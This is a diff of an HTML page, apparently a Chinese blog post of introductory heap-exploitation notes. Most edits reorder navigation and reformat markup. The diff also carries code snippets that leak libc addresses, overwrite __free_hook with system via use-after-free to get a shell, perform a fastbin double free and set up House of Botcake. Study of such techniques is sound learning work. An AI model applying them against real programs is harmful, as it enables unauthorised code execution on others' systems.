@@ -219,9 +219,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/about/">
               
-              归档
+              关于
               
               
             </a>
@@ -252,9 +252,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/archive/">
               
-              分类
+              归档
               
               
             </a>
@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">550</span> In Total
+              Words <span class="post-count">546</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -422,16 +422,12 @@
 
         <h2 id="泄露libc">泄露libc</h2>
 <h3 id="知道libc版本">知道libc版本</h3>
-<p>通过将freebin加入到unsortedbin
-，此时unsorted的freebin中的fd即可泄露libc中的main_arena地址</p>
+<p>通过将freebin加入到unsortedbin ，此时unsorted的freebin中的fd即可泄露libc中的main_arena地址</p>
 <p>可通过gdb中的vmmap查看libc计算相对地址</p>
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
 libc_addr = main_arena_addr - <span class="hljs-number">0x3c4b78</span>
 libc.address = libc_addr</code></pre>
-<figure>
-<img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222111213954-1679370065075-1.png" alt="image-20230222111213954">
-<figcaption aria-hidden="true">image-20230222111213954</figcaption>
-</figure>
+<p><img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222111213954-1679370065075-1.png" alt="image-20230222111213954"></p>
 <p>distance计算</p>
 <h3 id="不知道libc版本">不知道libc版本</h3>
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> <span class="hljs-comment">#固定的96偏移</span>
@@ -440,7 +436,7 @@ libc=LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,mal
 offset = malloc_hook_addr - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)
 system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)
 free_hook = offset + libc.dump(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)</code></pre>
-<h2 id="freehook-uaf">Freehook + UAF</h2>
+<h2 id="Freehook-UAF">Freehook + UAF</h2>
 <pre><code class="hljs python">free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
 edit_note(<span class="hljs-number">6</span>,p64(free_hook))<span class="hljs-comment">#UAF 把tcache[6]中的next指针覆写为free_hook_addr</span>
 add_note(<span class="hljs-number">9</span>,<span class="hljs-number">0x80</span>) <span class="hljs-comment">#9为从tcache申请的chunk</span>
@@ -448,7 +444,7 @@ add_note(<span class="hljs-number">10</span>,<span class="hljs-number">0x80</spa
 edit_note(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) 
 edit_note(<span class="hljs-number">10</span>,p64(system_addr))<span class="hljs-comment">#向free_hook中写入system地址</span></code></pre>
 <p>最后free(9)就能getshell</p>
-<h2 id="fastbin-doublefree">FastBin + DoubleFree</h2>
+<h2 id="FastBin-DoubleFree">FastBin + DoubleFree</h2>
 <pre><code class="hljs python">dd(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>)
 add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>)
 add(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x50</span>)
@@ -476,11 +472,8 @@ add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<sp
 pause()
 delete(<span class="hljs-number">4</span>)
 <span class="hljs-comment">#free且传参/bin/sh</span></code></pre>
-<figure>
-<img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222112549250-1679370065076-3.png" alt="image-20230222112549250">
-<figcaption aria-hidden="true">image-20230222112549250</figcaption>
-</figure>
-<h2 id="house-of-botcake">House Of Botcake</h2>
+<p><img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222112549250-1679370065076-3.png" alt="image-20230222112549250"></p>
+<h2 id="House-Of-Botcake">House Of Botcake</h2>
 <pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
     add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
@@ -650,7 +643,7 @@ delete(<span class="hljs-number">12</span>)</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#freehook-uaf"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Freehook + UAF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#fastbin-doublefree"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">FastBin + DoubleFree</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#house-of-botcake"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">House Of Botcake</span></a></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Freehook-UAF"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Freehook + UAF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#FastBin-DoubleFree"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">FastBin + DoubleFree</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#House-Of-Botcake"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">House Of Botcake</span></a></li></ol>
         
         </div>
       </aside>
